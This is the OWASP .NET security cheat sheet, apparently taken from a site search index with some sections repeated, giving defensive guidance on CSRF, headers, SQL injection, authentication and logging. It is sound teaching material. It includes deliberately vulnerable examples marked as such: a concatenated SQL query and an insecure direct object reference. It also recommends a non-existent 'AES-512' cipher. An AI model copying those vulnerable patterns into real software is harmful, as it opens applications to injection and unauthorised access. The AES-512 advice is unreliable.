to keep all of your packages up to date. Watch the updates on your development setup, and plan updates to your applications accordingly. General \u00b6 Lock down the config file. Remove all aspects of configuration that are not in use. Encrypt sensitive parts of the web.config using aspnet_regiis -pe ( command line help ). For Click Once applications the .Net Framework should be upgraded to use version 4.6.2 to ensure TLS 1.1/1.2 support. ASP NET Web Forms Guidance \u00b6 ASP.NET Web Forms is the original browser-based application development API for the .NET framework, and is still the most common enterprise platform for web application development. Always use HTTPS . Enable requireSSL on cookies and form elements and HttpOnly on cookies in the web.config. Implement customErrors . Make sure tracing is turned off. While viewstate isn't always appropriate for web development, using it can provide CSRF mitigation. To make the ViewState protect against CSRF attacks you need to set the ViewStateUserKey : protected override OnInit ( EventArgs e ) { base . OnInit ( e ); ViewStateUserKey = Session . SessionID ; } If you don't use Viewstate, then look to the default master page of the ASP.NET Web Forms default template for a manual anti-CSRF token using a double-submit cookie. private const string AntiXsrfTokenKey = \"__AntiXsrfToken\" ; private const string AntiXsrfUserNameKey = \"__AntiXsrfUserName\" ; private string _antiXsrfTokenValue ; protected void Page_Init ( object sender , EventArgs e ) { // The code below helps to protect against XSRF attacks var requestCookie = Request . Cookies [ AntiXsrfTokenKey ]; Guid requestCookieGuidValue ; if ( requestCookie != null && Guid . TryParse ( requestCookie . Value , out requestCookieGuidValue )) { // Use the Anti-XSRF token from the cookie _antiXsrfTokenValue = requestCookie . Value ; Page . ViewStateUserKey = _antiXsrfTokenValue ; } else { // Generate a new Anti-XSRF token and save to the cookie _antiXsrfTokenValue = Guid . NewGuid (). ToString ( \"N\" ); Page . ViewStateUserKey = _antiXsrfTokenValue ; var responseCookie = new HttpCookie ( AntiXsrfTokenKey ) { HttpOnly = true , Value = _antiXsrfTokenValue }; if ( FormsAuthentication . RequireSSL && Request . IsSecureConnection ) { responseCookie . Secure = true ; } Response . Cookies . Set ( responseCookie ); } Page . PreLoad += master_Page_PreLoad ; } protected void master_Page_PreLoad ( object sender , EventArgs e ) { if (! IsPostBack ) { // Set Anti-XSRF token ViewState [ AntiXsrfTokenKey ] = Page . ViewStateUserKey ; ViewState [ AntiXsrfUserNameKey ] = Context . User . Identity . Name ?? String . Empty ; } else { // Validate the Anti-XSRF token if (( string ) ViewState [ AntiXsrfTokenKey ] != _antiXsrfTokenValue || ( string ) ViewState [ AntiXsrfUserNameKey ] != ( Context . User . Identity . Name ?? String . Empty )) { throw new InvalidOperationException ( \"Validation of Anti-XSRF token failed.\" ); } } } Consider HSTS in IIS. See here for the procedure. This is a recommended web.config setup that handles HSTS among other things. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <configuration> <system.web> <httpRuntime enableVersionHeader= \"false\" /> </system.web> <system.webServer> <security> <requestFiltering removeServerHeader= \"true\" /> </security> <staticContent> <clientCache cacheControlCustom= \"public\" cacheControlMode= \"UseMaxAge\" cacheControlMaxAge= \"1.00:00:00\" setEtag= \"true\" /> </staticContent> <httpProtocol> <customHeaders> <add name= \"Content-Security-Policy\" value= \"default-src 'none'; style-src 'self'; img-src 'self'; font-src 'self'\" /> <add name= \"X-Content-Type-Options\" value= \"NOSNIFF\" /> <add name= \"X-Frame-Options\" value= \"DENY\" /> <add name= \"X-Permitted-Cross-Domain-Policies\" value= \"master-only\" /> <add name= \"X-XSS-Protection\" value= \"0\" /> <remove name= \"X-Powered-By\" /> </customHeaders> </httpProtocol> <rewrite> <rules> <rule name= \"Redirect to https\" > <match url= \"(.*)\" /> <conditions> <add input= \"{HTTPS}\" pattern= \"Off\" /> <add input= \"{REQUEST_METHOD}\" pattern= \"^get$|^head$\" /> </conditions> <action type= \"Redirect\" url= \"https://{HTTP_HOST}/{R:1}\" redirectType= \"Permanent\" /> </rule> </rules> <outboundRules> <rule name= \"Add HSTS Header\" enabled= \"true\" > <match serverVariable= \"RESPONSE_Strict_Transport_Security\" pattern= \".*\" /> <conditions> <add input= \"{HTTPS}\" pattern= \"on\" ignoreCase= \"true\" /> </conditions> <action type= \"Rewrite\" value= \"max-age=15768000\" /> </rule> </outboundRules> </rewrite> </system.webServer> </configuration> Remove the version header. <httpRuntime enableVersionHeader= \"false\" /> Also remove the Server header. HttpContext . Current . Response . Headers . Remove ( \"Server\" ); HTTP validation and encoding \u00b6 Do not disable validateRequest in the web.config or the page setup. This value enables limited XSS protection in ASP.NET and should be left intact as it provides partial prevention of Cross Site Scripting. Complete request validation is recommended in addition to the built-in protections. The 4.5 version of the .NET Frameworks includes the AntiXssEncoder library, which has a comprehensive input encoding library for the prevention of XSS. Use it. Whitelist allowable values anytime user input is accepted. Validate the URI format using Uri.IsWellFormedUriString . Forms authentication \u00b6 Use cookies for persistence when possible. Cookieless auth will default to UseDeviceProfile . Don't trust the URI of the request for persistence of the session or authorization. It can be easily faked. Reduce the forms authentication timeout from the default of 20 minutes to the shortest period appropriate for your application. If slidingExpiration is used this timeout resets after each request, so active users won't be affected. If HTTPS is not used, slidingExpiration should be disabled. Consider disabling slidingExpiration even with HTTPS. Always implement proper access controls. Compare user provided username with User.Identity.Name . Check roles against User.Identity.IsInRole . Use the ASP.NET Membership provider and role provider , but review the password storage. The default storage hashes the password with a single iteration of SHA-1 which is rather weak. The ASP.NET MVC4 template uses ASP.NET Identity instead of ASP.NET Membership, and ASP.NET Identity uses PBKDF2 by default which is better. Review the OWASP Password Storage Cheat Sheet for more information. Explicitly authorize resource requests. Leverage role based authorization using User.Identity.IsInRole . ASP NET MVC Guidance \u00b6 ASP.NET MVC (Model\u2013View\u2013Controller) is a contemporary web application framework that uses more standardized HTTP communication than the Web Forms postback model. The OWASP Top 10 2017 lists the most prevalent and dangerous threats to web security in the world today and is reviewed every 3 years. This section is based on this. Your approach to securing your web application should be to start at the top threat A1 below and work down, this will ensure that any time spent on security will be spent most effectively spent and cover the top threats first and lesser threats afterwards. After covering the top 10 it is generally advisable to assess for other threats or get a professionally completed Penetration Test. A1 Injection \u00b6 SQL Injection \u00b6 DO: Using an object relational mapper (ORM) or stored procedures is the most effective way of countering the SQL Injection vulnerability. DO: Use parameterized queries where a direct sql query must be used. More Information can be found here . e.g. In entity frameworks: var sql = @ \"Update [User] SET FirstName = @FirstName WHERE Id = @Id\" ; context . Database . ExecuteSqlCommand ( sql , new SqlParameter ( \"@FirstName\" , firstname ), new SqlParameter ( \"@Id\" , id )); DO NOT: Concatenate strings anywhere in your code and execute them against your database (Known as dynamic sql). NB: You can still accidentally do this with ORMs or Stored procedures so check everywhere. e.g string strQry = \"SELECT * FROM Users WHERE UserName='\" + txtUser . Text + \"' AND Password='\" + txtPassword . Text + \"'\" ; EXEC strQry // SQL Injection vulnerability ! DO: Practice Least Privilege - Connect to the database using an account with a minimum set of permissions required to do it's job i.e. not the sa account OS Injection \u00b6 Information about OS Injection can be found on this cheat sheet . DO: Use System.Diagnostics.Process.Start to call underlying OS functions. e.g System . Diagnostics . Process process = new System . Diagnostics . Process (); System . Diagnostics . ProcessStartInfo startInfo = new System . Diagnostics . ProcessStartInfo (); startInfo . FileName = \"validatedCommand\" ; startInfo . Arguments = \"validatedArg1 validatedArg2 validatedArg3\" ; process . StartInfo = startInfo ; process . Start (); DO: Use whitelist validation on all user supplied input. Input validation prevents improperly formed data from entering an information system. For more information please see the Input Validation Cheat Sheet . e.g Validating user input using IPAddress.TryParse Method //User input string ipAddress = \"127.0.0.1\" ; //check to make sure an ip address was provided if (! string . IsNullOrEmpty ( ipAddress )) { // Create an instance of IPAddress for the specified address string (in // dotted-quad, or colon-hexadecimal notation). if ( IPAddress . TryParse ( ipAddress , out var address )) { // Display the address in standard notation. return address . ToString (); } else { //ipAddress is not of type IPAddress ... } ... } LDAP injection \u00b6 Almost any characters can be used in Distinguished Names. However, some must be escaped with the backslash \\ escape character. A table showing which characters that should be escaped for Active Directory can be found at the in the LDAP Injection Prevention Cheat Sheet . NB: The space character must be escaped only if it is the leading or trailing character in a component name, such as a Common Name. Embedded spaces should not be escaped. More information can be found here . A2 Broken Authentication \u00b6 DO: Use ASP.net Core Identity . ASP.net Core Identity framework is well configured by default, where it uses secure password hashes and an individual salt. Identity uses the PBKDF2 hashing function for passwords, and they generate a random salt per user. DO: Set secure password policy e.g ASP.net Core Identity //startup.cs services . Configure < IdentityOptions >( options => { // Password settings options . Password . RequireDigit = true ; options . Password . RequiredLength = 8 ; options . Password . RequireNonAlphanumeric = true ; options . Password . RequireUppercase = true ; options . Password . RequireLowercase = true ; options . Password . RequiredUniqueChars = 6 ; options . Lockout . DefaultLockoutTimeSpan = TimeSpan . FromMinutes ( 30 ); options . Lockout . MaxFailedAccessAttempts = 3 ; options . SignIn . RequireConfirmedEmail = true ; options . User . RequireUniqueEmail = true ; }); DO: Set a cookie policy e.g //startup.cs services . ConfigureApplicationCookie ( options => { options . Cookie . HttpOnly = true ; options . Cookie . Expiration = TimeSpan . FromHours ( 1 ) options . SlidingExpiration = true ; }); A3 Sensitive Data Exposure \u00b6 DO NOT: Store encrypted passwords . DO: Use a strong hash to store password credentials. For hash refer to this section . DO: Enforce passwords with a minimum complexity that will survive a dictionary attack i.e. longer passwords that use the full character set (numbers, symbols and letters) to increase the entropy. DO: Use a strong encryption routine such as AES-512 where personally identifiable data needs to be restored to it's original format. Protect encryption keys more than any other asset, please find more information of storing encryption keys at rest . Apply the following test: Would you be happy leaving the data on a spreadsheet on a bus for everyone to read. Assume the attacker can get direct access to your database and protect it accordingly. More information can be found here . DO: Use TLS 1.2 for your entire site. Get a free certificate LetsEncrypt.org . DO NOT: Allow SSL, this is now obsolete . DO: Have a strong TLS policy (see SSL Best Practices ), use TLS 1.2 wherever possible. Then check the configuration using SSL Test or TestSSL . DO: Ensure headers are not disclosing information about your application. See HttpHeaders.cs , Dionach StripHeaders , disable via web.config or startup.cs : More information on Transport Layer Protection can be found here . e.g Web.config <system.web> <httpRuntime enableVersionHeader= \"false\" /> </system.web> <system.webServer> <security> <requestFiltering removeServerHeader= \"true\" /> </security> <httpProtocol> <customHeaders> <add name= \"X-Content-Type-Options\" value= \"nosniff\" /> <add name= \"X-Frame-Options\" value= \"DENY\" /> <add name= \"X-Permitted-Cross-Domain-Policies\" value= \"master-only\" /> <add name= \"X-XSS-Protection\" value= \"0\" /> <remove name= \"X-Powered-By\" /> </customHeaders> </httpProtocol> </system.webServer> e.g Startup.cs app . UseHsts ( hsts => hsts . MaxAge ( 365 ). IncludeSubdomains ()); app . UseXContentTypeOptions (); app . UseReferrerPolicy ( opts => opts . NoReferrer ()); app . UseXXssProtection ( options => options . FilterDisabled ()); app . UseXfo ( options => options . Deny ()); app . UseCsp ( opts => opts . BlockAllMixedContent () . StyleSources ( s => s . Self ()) . StyleSources ( s => s . UnsafeInline ()) . FontSources ( s => s . Self ()) . FormActions ( s => s . Self ()) . FrameAncestors ( s => s . Self ()) . ImageSources ( s => s . Self ()) . ScriptSources ( s => s . Self ()) ); For more information about headers can be found here . A4 XML External Entities (XXE) \u00b6 Please refer to the XXE cheat sheet so more detailed information, which can be found here . XXE attacks occur when an XML parse does not properly process user input that contains external entity declaration in the doctype of an XML payload. Below are the three most common XML Processing Options for .NET. A5 Broken Access Control \u00b6 Weak Account management \u00b6 Ensure cookies are sent via httpOnly: CookieHttpOnly = true , Reduce the time period a session can be stolen in by reducing session timeout and removing sliding expiration: ExpireTimeSpan = TimeSpan . FromMinutes ( 60 ), SlidingExpiration = false See here for full startup code snippet Ensure cookie is sent over HTTPS in the production environment. This should be enforced in the config transforms: <httpCookies requireSSL= \"true\" xdt:Transform= \"SetAttributes(requireSSL)\" /> <authentication> <forms requireSSL= \"true\" xdt:Transform= \"SetAttributes(requireSSL)\" /> </authentication> Protect LogOn, Registration and password reset methods against brute force attacks by throttling requests (see code below), consider also using ReCaptcha. [HttpPost] [AllowAnonymous] [ValidateAntiForgeryToken] [AllowXRequestsEveryXSecondsAttribute(Name = \"LogOn\", Message = \"You have performed this action more than {x} times in the last {n} seconds.\", Requests = 3, Seconds = 60)] public async Task < ActionResult > LogOn ( LogOnViewModel model , string returnUrl ) DO NOT: Roll your own authentication or session management, use the one provided by .Net DO NOT: Tell someone if the account exists on LogOn, Registration or Password reset. Say something like 'Either the username or password was incorrect', or 'If this account exists then a reset token will be sent to the registered email address'. This protects against account enumeration. The feedback to the user should be identical whether or not the account exists, both in terms of content and behavior: e.g. if the response takes 50% longer when the account is real then membership information can be guessed and tested. Missing function-level access control \u00b6 DO: Authorize users on all externally facing endpoints. The .NET framework has many ways to authorize a user, use them at method level: [Authorize(Roles = \"Admin\")] [HttpGet] public ActionResult Index ( int page = 1 ) or better yet, at controller level: [Authorize] public class UserController You can also check roles in code using identity features in .net: System.Web.Security.Roles.IsUserInRole(userName, roleName) You can find more information here on Access Control and here for Authorization. Insecure Direct object references \u00b6 When you have a resource (object) which can be accessed by a reference (in the sample below this is the id ) then you need to ensure that the user is intended to be there // Insecure public ActionResult Edit ( int id ) { var user = _context . Users . FirstOrDefault ( e => e . Id == id ); return View ( \"Details\" , new UserViewModel ( user ); } // Secure public ActionResult Edit ( int id ) { var user = _context . Users . FirstOrDefault ( e => e . Id == id ); // Establish user has right to edit the details if ( user . Id != _userIdentity . GetUserId ()) { HandleErrorInfo error = new HandleErrorInfo ( new Exception ( \"INFO: You do not have permission to edit these details\" )); return View ( \"Error\" , error ); } return View ( \"Edit\" , new UserViewModel ( user ); } More information can be found here for Insecure Direct Object Reference. A6 Security Misconfiguration \u00b6 Debug and Stack Trace \u00b6 Ensure debug and trace are off in production. This can be enforced using web.config transforms: <compilation xdt:Transform= \"RemoveAttributes(debug)\" /> <trace enabled= \"false\" xdt:Transform= \"Replace\" /> DO NOT: Use default passwords DO: (When using TLS) Redirect a request made over Http to https: e.g Global.asax.cs protected void Application_BeginRequest () { #if !DEBUG // SECURE: Ensure any request is returned over SSL/TLS in production if (! Request . IsLocal && ! Context . Request . IsSecureConnection ) { var redirect = Context . Request . Url . ToString () . ToLower ( CultureInfo . CurrentCulture ) . Replace ( \"http:\" , \"https:\" ); Response . Redirect ( redirect ); } #endif } e.g Startup.cs in the Configure() app . UseHttpsRedirection (); Cross-site request forgery \u00b6 DO NOT: Send sensitive data without validating Anti-Forgery-Tokens ( .NET / .NET Core ). DO: Send the anti-forgery token with every POST/PUT request: Using .NET Framework \u00b6 using ( Html . BeginForm ( \"LogOff\" , \"Account\" , FormMethod . Post , new { id = \"logoutForm\" , @class = \"pull-right\" })) { @Html . AntiForgeryToken () < ul class = \"nav nav-pills\" > < li role = \"presentation\" > Logged on as @User . Identity . Name </ li > < li role = \"presentation\" > < a href = \"javascript:document.getElementById('logoutForm').submit()\" > Log off </ a > </ li > </ ul > } Then validate it at the method or preferably the controller level: [HttpPost] [ValidateAntiForgeryToken] public ActionResult LogOff () Make sure the tokens are removed completely for invalidation on logout. /// <summary> /// SECURE: Remove any remaining cookies including Anti-CSRF cookie /// </summary> public void RemoveAntiForgeryCookie ( Controller controller ) { string [] allCookies = controller . Request . Cookies . AllKeys ; foreach ( string cookie in allCookies ) { if ( controller . Response . Cookies [ cookie ] != null && cookie == \"__RequestVerificationToken\" ) { controller . Response . Cookies [ cookie ]. Expires = DateTime . Now . AddDays (- 1 ); } } } Using .NET Core 2.0 or later \u00b6 Starting with .NET Core 2.0 it is possible to automatically generate and verify the antiforgery token . If you are using tag-helpers , which is the default for most web project templates, then all forms will automatically send the anti-forgery token. You can check if tag-helpers are enabled by checking if your main _ViewImports.cshtml file contains: @addTagHelper *, Microsoft . AspNetCore . Mvc . TagHelpers IHtmlHelper.BeginForm also sends anti-forgery-tokens automatically. Unless you are using tag-helpers or IHtmlHelper.BeginForm , you must use the requisite helper on forms as seen here: < form action = \"RelevantAction\" > @Html.AntiForgeryToken() </ form > To automatically validate all requests other than GET, HEAD, OPTIONS and TRACE you need to add a global action filter with the AutoValidateAntiforgeryToken attribute inside your Startup.cs as mentioned in the following article : services . AddMvc ( options => { options . Filters . Add ( new AutoValidateAntiforgeryTokenAttribute ()); }); If you need to disable the attribute validation for a specific method on a controller you can add the IgnoreAntiforgeryToken attribute to the controller method (for MVC controllers) or parent class (for Razor pages): [IgnoreAntiforgeryToken] [HttpDelete] public IActionResult Delete () [IgnoreAntiforgeryToken] public class UnsafeModel : PageModel If you need to also validate the token on GET, HEAD, OPTIONS or TRACE - requests you can add the ValidateAntiforgeryToken attribute to the controller method (for MVC controllers) or parent class (for Razor pages): [HttpGet] [ValidateAntiforgeryToken] public IActionResult DoSomethingDangerous () [HttpGet] [ValidateAntiforgeryToken] public class SafeModel : PageModel In case you can't use a global action filter, add the AutoValidateAntiforgeryToken attribute to your controller classes or razor page models: [AutoValidateAntiforgeryToken] public class UserController [AutoValidateAntiforgeryToken] public class SafeModel : PageModel Using .Net Core 2.0 or .NET Framework with AJAX \u00b6 You will need to attach the anti-forgery token to AJAX requests. If you are using jQuery in an ASP.NET Core MVC view this can be achieved using this snippet: @ inject Microsoft . AspNetCore . Antiforgery . IAntiforgery antiforgeryProvider $ . ajax ( { type : \"POST\" , url : '@Url.Action(\"Action\", \"Controller\")' , contentType : \"application/x-www-form-urlencoded; charset=utf-8\" , data : { id : id , '__RequestVerificationToken' : '@antiforgeryProvider.GetAndStoreTokens(this.Context).RequestToken' } }) If you are using the .NET Framework, you can find some code snippets here . More information can be found here for Cross-Site Request Forgery. A7 Cross-Site Scripting (XSS) \u00b6 DO NOT: Trust any data the user sends you, prefer white lists (always safe) over black lists You get encoding of all HTML content with MVC3, to properly encode all content whether HTML, javascript, CSS, LDAP etc use the Microsoft AntiXSS library: Install-Package AntiXSS Then set in config: <system.web> <httpRuntime targetFramework= \"4.5\" enableVersionHeader= \"false\" encoderType= \"Microsoft.Security.Application.AntiXssEncoder, AntiXssLibrary\" maxRequestLength= \"4096\" /> DO NOT: Use the [AllowHTML] attribute or helper class @Html.Raw unless you really know that the content you are writing to the browser is safe and has been escaped properly. DO: Enable a Content Security Policy , this will prevent your pages from accessing assets it should not be able to access (e.g. a malicious script): <system.webServer> <httpProtocol> <customHeaders> <add name= \"Content-Security-Policy\" value= \"default-src 'none'; style-src 'self'; img-src 'self'; font-src 'self'; script-src 'self'\" /> More information can be found here for Cross-Site Scripting. A8 Insecure Deserialization \u00b6 Information about Insecure Deserialization can be found on this cheat sheet . DO NOT: Accept Serialized Objects from Untrusted Sources DO: Validate User Input Malicious users are able to use objects like cookies to insert malicious information to change user roles. In some cases, hackers are able to elevate their privileges to administrator rights by using a pre-existing or cached password hash from a previous session. DO: Prevent Deserialization of Domain Objects DO: Run the Deserialization Code with Limited Access Permissions If a deserialized hostile object tries to initiate a system processes or access a resource within the server or the host's OS, it will be denied access and a permission flag will be raised so that a system administrator is made aware of any anomalous activity on the server. More information can be found here: Deserialization Cheat Sheet A9 Using Components with Known Vulnerabilities \u00b6 DO: Keep the .Net framework updated with the latest patches DO: Keep your NuGet packages up to date, many will contain their own vulnerabilities. DO: Run the OWASP Dependency Checker against your application as part of your build process and act on any high level vulnerabilities. A10 Insufficient Logging & Monitoring \u00b6 DO: Ensure all login, access control failures and server-side input validation failures can be logged with sufficient user context to identify suspicious or malicious accounts. DO: Establish effective monitoring and alerting so suspicious activities are detected and responded to in a timely fashion. DO NOT: Log generic error messages such as: csharp Log.Error(\"Error was thrown\"); rather log the stack trace, error message and user ID who caused the error. DO NOT: Log sensitive data such as user's passwords. Logging \u00b6 What Logs to Collect and more information about Logging can be found on this cheat sheet . .NET Core come with a LoggerFactory, which is in Microsoft.Extensions.Logging. More information about ILogger can be found here . How to log all errors from the Startup.cs , so that anytime an error is thrown it will be logged. public void Configure ( IApplicationBuilder app , IHostingEnvironment env ) { if ( env . IsDevelopment ()) { _isDevelopment = true ; app . UseDeveloperExceptionPage (); } //Log all errors in the application app . UseExceptionHandler ( errorApp => { errorApp . Run ( async context => { var errorFeature = context . Features . Get < IExceptionHandlerFeature >(); var exception = errorFeature . Error ; Log . Error ( String . Format ( \"Stacktrace of error: {0}\" , exception . StackTrace . ToString ())); }); }); app . UseAuthentication (); app . UseMvc (); } } e.g Injecting into the class constructor, which makes writing unit test simpler. It is recommended if instances of the class will be created using dependency injection (e.g. MVC controllers). The below example shows logging of all unsuccessful log in attempts. public class AccountsController : Controller { private ILogger _Logger ; public AccountsController ( ILogger logger ) { _Logger = logger ; } [HttpPost] [AllowAnonymous] [ValidateAntiForgeryToken] public async Task < IActionResult > Login ( LoginViewModel model ) { if ( ModelState . IsValid ) { var result = await _signInManager . PasswordSignInAsync ( model . Email , model . Password , model . RememberMe , lockoutOnFailure : false ); if ( result . Succeeded ) { //Log all successful log in attempts Log . Information ( String . Format ( \"User: {0}, Successfully Logged in\" , model . Email )); //Code for successful login } else { //Log all incorrect log in attempts Log . Information ( String . Format ( \"User: {0}, Incorrect Password\" , model . Email )); } } ... Logging levels for ILogger are listed below, in order of high to low importance: Monitoring \u00b6 Monitoring allow us to validate the performance and health of a running system through key performance indicators. In .NET a great option to add monitoring capabilities is Application Insights . More information about Logging and Monitoring can be found here . OWASP 2013 \u00b6 Below is vulnerability not discussed in OWASP 2017 A10 Unvalidated redirects and forwards \u00b6 A protection against this was introduced in Mvc 3 template. Here is the code: public async Task < ActionResult > LogOn ( LogOnViewModel model , string returnUrl ) { if ( ModelState . IsValid ) { var logonResult = await _userManager . TryLogOnAsync ( model . UserName , model . Password ); if ( logonResult . Success ) { await _userManager . LogOnAsync ( logonResult . UserName , model . RememberMe ); return RedirectToLocal ( returnUrl ); ... private ActionResult RedirectToLocal ( string returnUrl ) { if ( Url . IsLocalUrl ( returnUrl )) { return Redirect ( returnUrl ); } else { return RedirectToAction ( \"Landing\" , \"Account\" ); } } Other advice: Protect against Clickjacking and man in the middle attack from capturing an initial Non-TLS request, set the X-Frame-Options and Strict-Transport-Security (HSTS) headers. Full details here Protect against a man in the middle attack for a user who has never been to your site before. Register for HSTS preload Maintain security testing and analysis on Web API services. They are hidden inside MEV sites, and are public parts of a site that will be found by an attacker. All of the MVC guidance and much of the WCF guidance applies to the Web API. Unvalidated Redirects and Forwards Cheat Sheet . More information: For more information on all of the above and code samples incorporated into a sample MVC5 application with an enhanced security baseline go to Security Essentials Baseline project XAML Guidance \u00b6 Work within the constraints of Internet Zone security for your application. Use ClickOnce deployment. For enhanced permissions, use permission elevation at runtime or trusted application deployment at install time. Windows Forms Guidance \u00b6 Use partial trust when possible. Partially trusted Windows applications reduce the attack surface of an application. Manage a list of what permissions your app must use, and what it may use, and then make the request for those permissions declaratively at runtime. Use ClickOnce deployment. For enhanced permissions, use permission elevation at runtime or trusted application deployment at install time. WCF Guidance \u00b6 Keep in mind that the only safe way to pass a request in RESTful services is via HTTP POST , with TLS enabled . GETs are visible in the querystring , and a lack of TLS means the body can be intercepted. Avoid BasicHttpBinding . It has no default security configuration. Use WSHttpBinding instead. Use at least two security modes for your binding. Message security includes security provisions in the headers. Transport security means use of SSL. TransportWithMessageCredential combines the two. Test your WCF implementation with a fuzzer like the ZAP .","title":"DotNet Security"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#dotnet-security-cheat-sheet","text":"","title":"DotNet Security Cheat Sheet"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#introduction","text":"This page intends to provide quick basic .NET security tips for developers.","title":"Introduction"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#the-net-framework","text":"The .NET Framework is Microsoft's principal platform for enterprise development. It is the supporting API for ASP.NET, Windows Desktop applications, Windows Communication Foundation services, SharePoint, Visual Studio Tools for Office and other technologies.","title":"The .NET Framework"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#updating-the-framework","text":"The .NET Framework is kept up-to-date by Microsoft with the Windows Update service. Developers do not normally need to run separate updates to the Framework. Windows Update can be accessed at Windows Update or from the Windows Update program on a Windows computer. Individual frameworks can be kept up to date using NuGet . As Visual Studio prompts for updates, build it into your lifecycle. Remember that third-party libraries have to be updated separately and not all of them use NuGet. ELMAH for instance, requires a separate update effort.","title":"Updating the Framework"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#security-announcements","text":"Receive security notifications by selecting the \"Watch\" button at the following repositories: .NET Core Security Announcements ASP.NET Core & Entity Framework Core Security Announcements","title":"Security Announcements"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#net-framework-guidance","text":"The .NET Framework is the set of APIs that support an advanced type system, data, graphics, network, file handling and most of the rest of what is needed to write enterprise apps in the Microsoft ecosystem. It is a nearly ubiquitous library that is strongly named and versioned at the assembly level.","title":".NET Framework Guidance"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#data-access","text":"Use Parameterized SQL commands for all data access, without exception. Do not use SqlCommand with a string parameter made up of a concatenated SQL String . Whitelist allowable values coming from the user. Use enums, TryParse or lookup values to assure that the data coming from the user is as expected. Enums are still vulnerable to unexpected values because .NET only validates a successful cast to the underlying data type, integer by default. Enum.IsDefined can validate whether the input value is valid within the list of defined constants. Apply the principle of least privilege when setting up the Database User in your database of choice. The database user should only be able to access items that make sense for the use case. Use of the Entity Framework is a very effective SQL injection prevention mechanism. Remember that building your own ad hoc queries in Entity Framework is just as susceptible to SQLi as a plain SQL query . When using SQL Server, prefer integrated authentication over SQL authentication . Use Always Encrypted where possible for sensitive data (SQL Server 2016 and SQL Azure),","title":"Data Access"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#encryption","text":"Never, ever write your own encryption. Use the Windows Data Protection API (DPAPI) for secure local storage of sensitive data. Use a strong hash algorithm. In .NET (both Framework and Core) the strongest hashing algorithm for general hashing requirements is System.Security.Cryptography.SHA512 . In the .NET framework the strongest algorithm for password hashing is PBKDF2, implemented as System.Security.Cryptography.Rfc2898DeriveBytes . In .NET Core the strongest algorithm for password hashing is PBKDF2, implemented as Microsoft.AspNetCore.Cryptography.KeyDerivation.Pbkdf2 which has several significant advantages over Rfc2898DeriveBytes . When using a hashing function to hash non-unique inputs such as passwords, use a salt value added to the original value before hashing. Make sure your application or protocol can easily support a future change of cryptographic algorithms. Use Nuget to keep all of your packages up to date. Watch the updates on your development setup, and plan updates to your applications accordingly.","title":"Encryption"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#general","text":"Lock down the config file. Remove all aspects of configuration that are not in use. Encrypt sensitive parts of the web.config using aspnet_regiis -pe ( command line help ). For Click Once applications the .Net Framework should be upgraded to use version 4.6.2 to ensure TLS 1.1/1.2 support.","title":"General"},{"location":"cheatsheets/DotNet_Security_Cheat_Sheet.html#asp-net-web-forms-guidance","text":"ASP.NET Web Forms is the original browser-based application development API for the .NET framework, and is still the most common enterprise platform for web application development. Always use HTTPS . Enable requireSSL on cookies and form elements and HttpOnly on cookies in the web.config. Implement customErrors . Make sure tracing is turned off. While viewstate isn't always appropriate for web development, using it can provide CSRF mitigation. To make the ViewState protect against CSRF attacks you need to set the ViewStateUserKey : protected override OnInit ( EventArgs e ) { base . OnInit ( e ); ViewStateUserKey = Session . SessionID ; } If you don't use Viewstate, then look to the default master page of the ASP.NET Web Forms default template for a manual anti-CSRF token using a double-submit cookie. private const string AntiXsrfTokenKey = \"__AntiXsrfToken\" ; private const string AntiXsrfUserNameKey = \"__AntiXsrfUserName\" ; private string _antiXsrfTokenValue ; protected void Page_Init ( object sender , EventArgs e ) { // The code below helps to protect against XSRF attacks var requestCookie = Request . Cookies [ AntiXsrfTokenKey ]; Guid requestCookieGuidValue ; if ( requestCookie != null && Guid . TryParse ( requestCookie . Value , out requestCookieGuidValue )) { // Use the Anti-XSRF token from the cookie _antiXsrfTokenValue = requestCookie . Value ; Page . ViewStateUserKey = _antiXsrfTokenValue ; } else { // Generate a new Anti-XSRF token and save to the cookie _antiXsrfTokenValue = Guid . NewGuid (). ToString ( \"N\" ); Page . ViewStateUserKey = _antiXsrfTokenValue ; var responseCookie = new HttpCookie ( AntiXsrfTokenKey ) { HttpOnly = true , Value = _antiXsrfTokenValue }; if ( FormsAuthentication . RequireSSL && Request . IsSecureConnection ) { responseCookie . Secure = true ; } Response . Cookies . Set ( responseCookie ); } Page . PreLoad += master_Page_PreLoad ; } protected void master_Page_PreLoad ( object sender , EventArgs e ) { if (! IsPostBack ) { // Set Anti-XSRF token ViewState [ AntiXsrfTokenKey ] = Page . ViewStateUserKey ; ViewState [ AntiXsrfUserNameKey ] = Context . User . Identity . Name ?? String . Empty ; } else { // Validate the Anti-XSRF token if (( string ) ViewState [ AntiXsrfTokenKey ] != _antiXsrfTokenValue || ( string ) ViewState [ AntiXsrfUserNameKey ] != ( Context . User . Identity . Name ?? String . Empty )) { throw new InvalidOperationException ( \"Validation of Anti-XSRF token failed.\" ); } } } Consider HSTS in IIS. See here for the procedure. This is a recommended web.config setup that handles HSTS among other things. <?xml version=\"1.0\" encoding=\"UTF-8\"?> <configuration> <system.web> <httpRuntime enableVersionHeader= \"false\" /> </system.web> <system.webServer> <security> <requestFiltering removeServerHeader= \"true\" /> </security> <staticContent> <clientCache cacheControlCustom= \"public\" cacheControlMode= \"UseMaxAge\" cacheControlMaxAge= \"1.00:00:00\" setEtag= \"true\" /> </staticContent> <httpProtocol> <customHeaders> <add name= \"Content-Security-Policy\" value= \"default-src 'none'; style-src 'self'; img-src 'self'; font-src 'self'\" /> <add name= \"X-Content-Type-Options\" value= \"NOSNIFF\" /> <add name= \"X-Frame-Options\" value= \"DENY\" /> <add name= \"X-Permitted-Cross-Domain-Policies\" value= \"master-only\" /> <add name= \"X-XSS-Protection\" value= \"0\" /> <remove name= \"X-Powered-By\" /> </customHeaders> </httpProtocol> <rewrite> <rules> <rule name= \"Redirect to https\" > <match url= \"(.*)\" /> <conditions> <add input= \"{HTTPS}\" pattern= \"Off\" /> <add input= \"{REQUEST_METHOD}\" pattern= \"^get$|^head$\" /> </conditions> <action type= \"Redirect\" url= 